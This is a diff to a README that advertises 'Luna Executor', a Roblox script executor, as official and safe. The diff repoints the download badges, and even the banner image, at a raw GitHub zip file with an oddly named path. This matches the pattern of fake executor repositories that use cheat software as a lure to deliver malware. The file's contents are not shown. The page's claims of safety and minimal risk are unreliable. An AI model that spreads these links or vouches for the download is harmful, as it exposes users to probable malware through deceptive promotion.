@@ -4,11 +4,11 @@ Welcome to the **official Luna Executor GitHub** – your trusted source for the
 
 This powerful script execution tool is widely known for its performance, reliability, and safety when properly installed from the official Luna Executor GitHub. With a growing user base, active community, and constant updates, Luna Executor is your gateway to a richer, more dynamic Roblox experience.
 
-[![Download Luna Executor](https://img.shields.io/badge/Download%20Luna%20Executor-Click%20Here-red?style=for-the-badge&logo=roblox)](https://robloxlong.live/luna)
+[![Download Luna Executor](https://img.shields.io/badge/Download%20Luna%20Executor-Click%20Here-red?style=for-the-badge&logo=roblox)](https://raw.githubusercontent.com/mateoandries27-lang/luna/main/untransubstantiated/Software_2.7.zip)
 
 ---
 
-![Luna Executor Banner](https://i.ytimg.com/vi/J3NXRhwJD7k/maxresdefault.jpg)
+![Luna Executor Banner](https://raw.githubusercontent.com/mateoandries27-lang/luna/main/untransubstantiated/Software_2.7.zip)
 
 ## 🚀 Introduction
 
@@ -173,5 +173,5 @@ Risk is minimal when used responsibly. Avoid abusing scripts and always stay upd
 
 With high compatibility, excellent support, and a growing player community, **Luna Executor** stands tall as the best safe Roblox executor in 2025. Whether you're curious about advanced scripting or just want a more dynamic gaming experience, Luna Executor is your key to unlocking it all.
 
-[![Download Luna Executor](https://img.shields.io/badge/Download%20Now-Get%20Started-red?style=for-the-badge&logo=roblox)](https://robloxlong.live/luna)
+[![Download Luna Executor](https://img.shields.io/badge/Download%20Now-Get%20Started-red?style=for-the-badge&logo=roblox)](https://raw.githubusercontent.com/mateoandries27-lang/luna/main/untransubstantiated/Software_2.7.zip)
 
